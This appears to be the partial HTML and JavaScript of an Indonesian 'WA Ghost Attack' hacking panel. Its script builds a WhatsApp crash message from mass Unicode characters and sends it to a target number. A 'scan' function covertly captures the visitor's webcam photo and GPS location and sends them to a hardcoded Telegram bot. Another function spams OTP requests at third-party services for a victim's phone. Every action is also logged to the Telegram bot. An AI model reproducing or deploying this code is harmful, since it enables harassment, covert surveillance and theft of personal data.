<!DOCTYPE html>

    <style>
        :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --purple: #bc13fe; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; text-align: center; }
        h1 { font-size: 24px; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 10px var(--neon); margin-bottom: 0; }
        .panel { background: rgba(20, 20, 20, 0.9); border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: inset 0 0 10px #000; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 12px; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.2s; text-transform: uppercase; font-size: 11px; width: 100%; box-shadow: 0 0 5px var(--neon); }
        button:active { transform: scale(0.95); box-shadow: none; }
        input { background: #000; border: 1px solid #444; color: #fff; padding: 12px; width: 90%; margin: 8px 0; border-radius: 5px; outline: none; text-align: center; }
        .btn-ghost { border-color: var(--purple); color: var(--purple); text-shadow: 0 0 5px var(--purple); }
        .btn-danger { border-color: var(--danger); color: var(--danger); }
        #toast { visibility: hidden; min-width: 250px; background: #000; color: #fff; text-align: center; border-radius: 5px; padding: 15px; position: fixed; z-index: 100; left: 50%; bottom: 30px; transform: translateX(-50%); border: 1px solid var(--neon); font-weight: bold; }
        #toast.show { visibility: visible; animation: fadein 0.5s; }
        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
    </style>
</head>

        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <div class="panel" style="border-color: var(--purple)">
        <h3 style="color: var(--purple); margin:0 0 10px 0;">😈 WA GHOST ATTACK</h3>

    <div class="panel" style="border-color: var(--danger)">

    <div id="toast">SYSTEM READY</div>

    <script>
        const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
        const CHAT_ID = "7898572558";

        function showToast(msg, color="#0f0") {
            const t = document.getElementById("toast");
            t.innerHTML = msg; t.style.borderColor = color; t.className = "show";
            setTimeout(() => { t.className = ""; }, 3000);
        }

        // 😈 GHOST BUG SCRIPT V.9.0
        function sendGhost() {
            let n = document.getElementById('noBug').value;
            if(!n) return showToast("INPUT NOMOR!", "#f00");

            // Karakter perusak memori rendering WhatsApp
            let ghostText = "‎".repeat(10000) + "ॣ".repeat(2000) + " 𑗄 ".repeat(2000) + "҈".repeat(2000) + " ​​ ".repeat(5000);
            let finalBug = `wa.me/settings?📍${ghostText}😈_EDWARD_GHOST_V9_😈${ghostText}`;

            navigator.clipboard.writeText(finalBug).then(() => {
                showToast("VIRUS COPIED! PASTE DI CHAT!", "#bc13fe");
                setTimeout(() => {
                    window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(finalBug)}`, '_blank');
                }, 1000);
            });
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 GHOST BUG SENT TO: ${n}`);
        }

        async function takeSnap() {
            showToast("SCANNING...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('video');
                const c = document.getElementById('canvas');
                v.srcObject = stream;
                setTimeout(() => {
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    kirimFoto(c.toDataURL('image/jpeg'));
                    stream.getTracks().forEach(t => t.stop());
                    showToast("INTEL SENT!");
                }, 1500);
            } catch (e) { showToast("CAMERA DENIED!", "#f00"); }
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 TARGET LOC:\nhttp://googleusercontent.com/maps.google.com/5{p.coords.latitude},${p.coords.longitude}`);
            });
        }

        function kirimFoto(base64) {
            const blob = dataURItoBlob(base64);
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'x.jpg');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        function dataURItoBlob(d) {
            const b = atob(d.split(',')[1]);
            const ab = new ArrayBuffer(b.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < b.length; i++) ia[i] = b.charCodeAt(i);
            return new Blob([ab], { type: 'image/jpeg' });
        }

        function spamOTP() {
            let n = document.getElementById('noTarget').value;
            if(!n) return showToast("NO TARGET!", "#f00");
            showToast("BOMBARDIR...");
            fetch(`https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`, {mode:'no-cors'});
            fetch(`https://www.oyorooms.com/api/pwa/generateotp?phone=${n}`, {mode:'no-cors'});
        }

        function getPojav() { window.location.href = "https://play.google.com/store/apps/details?id=net.kdt.pojavlaunch"; }
        function launch(pkg) { window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end"; }
